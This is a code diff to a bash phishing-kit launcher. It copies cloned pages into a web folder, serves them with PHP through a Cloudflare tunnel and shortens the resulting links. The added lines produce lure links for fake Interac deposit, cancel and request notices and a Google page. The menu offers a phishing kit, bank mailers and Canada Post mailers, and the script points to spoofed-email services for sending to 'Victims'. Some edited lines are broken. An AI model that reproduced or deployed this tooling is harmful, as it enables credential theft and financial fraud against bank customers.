@@ -7,7 +7,7 @@ chmod -R 777 tunnels.sh
 chmod -R 777 .host
 chmod -R 777 .pages
 chmod -R 777 .tunnels_log
-chmod -R 777 /.www
+chmod -R 777 .www
 
 
 
@@ -85,8 +85,8 @@ if [[ ! -d ".host" ]]; then
 mkdir -p ".host"
 fi
 
-if [[ ! -d "/.www/" ]]; then
-mkdir -p "/.www/"
+if [[ ! -d ".www/" ]]; then
+mkdir -p ".www/"
 fi
 
 
@@ -171,9 +171,9 @@ setup_clone(){
     # Setup cloned page and server
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
 rm -rf .www/*
-cp -rf .pages/"$site"/* /.www/
+cp -rf .pages/"$site"/* .www/
 echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
+cd .www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
@@ -182,10 +182,10 @@ setup_clone_manual() {
 
    rm -rf .www/*
    
-   cp -rf .manual_attack/index.html /.www/
-   cp -rf .manual_attack/post.php /.www/
-   cp -rf .manual_attack/__ROOT__/index.php /.www/
-   cp -rf .manual_attack/__ROOT__/fingerprints.php /.www/
+   cp -rf .manual_attack/index.html .www/
+   cp -rf .manual_attack/post.php .www/
+   cp -rf .manual_attack/__ROOT__/index.php .www/
+   cp -rf .manual_attack/__ROOT__/fingerprints.php .www/
    
    
    rm -rf .manual_attack/index.html
@@ -193,7 +193,7 @@ setup_clone_manual() {
    rm -rf .manual_attack/data.txt
    
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-   cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
+   cd .www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
@@ -202,10 +202,10 @@ setup_clone_customize(){
 
     # Setup cloned page and server
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
-rm -rf /.www/*
-cp -rf .customize/"$site"/* /.www/
+rm -rf .www/*
+cp -rf .customize/"$site"/* .www/
 echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
-cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
+cd .www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
 }
 
 
@@ -265,38 +265,42 @@ credentials_manual
 
 
 
-
-
 # Start Cloudflared
 cloudflared_start() { 
-
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
-{ sleep 1; setup_clone; }
-echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
+	
+	echo -e ""
+	{ sleep 1; setup_clone; }
+	echo -ne "${MAGETNA}"
 
     if [[ `command -v termux-chroot` ]]; then
-sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     else
         sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
     fi
 
-{ sleep 12; clear; header; }
-
+	{ sleep 12; clear; header; }
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
-cldflr_url1=${cldflr_url#https://}
-
-url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
-
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
-
-
-}
-
-
-
+url_1="${cldflr_url}/public/deposit/1.html"
+url_2="${cldflr_url}/public/deposit/2.html"
+url_3="${cldflr_url}/public/deposit/3.html"
+url_4="${cldflr_url}/public/Google/GO.php"
+url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
+url2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_2")
+url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
+url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC DEPOSIT NOTICE "
+echo -e "${WHITE}$url1"
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC  CANCEL NOTICE"
+echo -e "${YELLOW}$url2"
+echo -e "${WHITE}==================================="
+echo -e "${RED}SEND INTERAC REQUEST NOTICE"
+echo -e "${YELLOW}$url3"
+echo -e "${WHITE}==================================="
+echo -e "${RED}CREATE A GOOGLE LINK "
+echo -e "${YELLOW}$url4"
+echo -e "${WHITE}==================================="
 
 
 # Start Cloudflared customize
@@ -346,14 +350,18 @@ sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunn
 { sleep 12; clear; header; }
 
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com/pub' ".tunnels_log/.cloudfl.log")
+
+
 cldflr_url1=${cldflr_url#https://}
 
 url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
 
+
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
 echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
-echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1
+echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short/P"
 
 
 }
@@ -539,14 +547,14 @@ ${RED}[+]
 ${RED}[+] [1] SARAH AIO MAIN     
 ${RED}[+] 
 ${RED}[//////////////////////][${CYAN}LIST 2 =${WHITE}CUSTOM ${CYAN}]${RED}
-${GREEN}[${WHITE}2${GREEN}]${CYAN}${TEAL}CANADA-POST   MAILER ${RED} [NO LOGIN REQUIRIED]
-${GREEN}[${WHITE}3${GREEN}]${CYAN}${TEAL}TRANSGENDER   MAILER ${RED} [NO LOGIN REQUIRIED]   
-${GREEN}[${WHITE}4${GREEN}]${CYAN}${TEAL}INTERAC-ATM        ${WHITE} [NO LOGIN REQUIRIED] 
-${GREEN}[${WHITE}5${GREEN}]${CYAN}${TEAL}CANADAPOST       ${WHITE}   [NO LOGIN REQUIRIED]
-${GREEN}[${WHITE}6${GREEN}]${CYAN}${RED}META GENERATOR   ${WHITE}   [NO LOGIN REQUIRIED]  
-${GREEN}[${WHITE}7${GREEN}]${CYAN}${RED}PHISHNG KIT MASTER ${WHITE} [NO LOGIN REQUIRIED]
-${GREEN}[${WHITE}8${GREEN}]${CYAN}${RED}BANK MAILER     ${WHITE}    [OTHER BONUS THINGS]
-${GREEN}[${WHITE}9${GREEN}]${CYAN}${RED}MAIN MENU        ${WHITE}   [OTHER BONUS THINGS]
+${GREEN}[${WHITE}2${GREEN}]${CYAN}${TEAL}CANADA-POST   MAILER ${RED} [OUT OF STOCK] 
+${GREEN}[${WHITE}3${GREEN}]${CYAN}${TEAL}TRANSGENDER   MAILER ${RED} [OUT OF STOCK]    
+${GREEN}[${WHITE}4${GREEN}]${CYAN}${TEAL}INTERAC-ATM       ${WHITE} [OUT OF STOCK] 
+${GREEN}[${WHITE}5${GREEN}]${CYAN}${TEAL}CANADAPOST        ${WHITE} [OUT OF STOCK] 
+${GREEN}[${WHITE}6${GREEN}]${CYAN}${RED}META GENERATOR     ${WHITE} [OUT OF STOCK]  
+${GREEN}[${WHITE}7${GREEN}]${CYAN}${RED}PHISHNG KIT MASTER ${WHITE} [OUT OF STOCK] 
+${GREEN}[${WHITE}8${GREEN}]${CYAN}${RED}BANK MAILER        ${WHITE} [OUT OF STOCK] 
+${GREEN}[${WHITE}9${GREEN}]${CYAN}${RED}MAIN MENU          ${WHITE} [OUT OF STOCK] 
 
 
 EOF
@@ -567,7 +575,7 @@ tunnel;;
 
 
     1)
-site="SARAG"
+site="xbox"
 tunnel;;
 
 
@@ -840,7 +848,7 @@ email() {
 
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Use this services for send email to Victims \n"
    
-    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https:/.www/.guerrillamail.com/ \n"
+    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https:.www/.guerrillamail.com/ \n"
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://emkei.cz/ ${MAGENTA} (recommended) \n"
     echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://mailspre.com/ \n"
     echo -ne "\n\n"
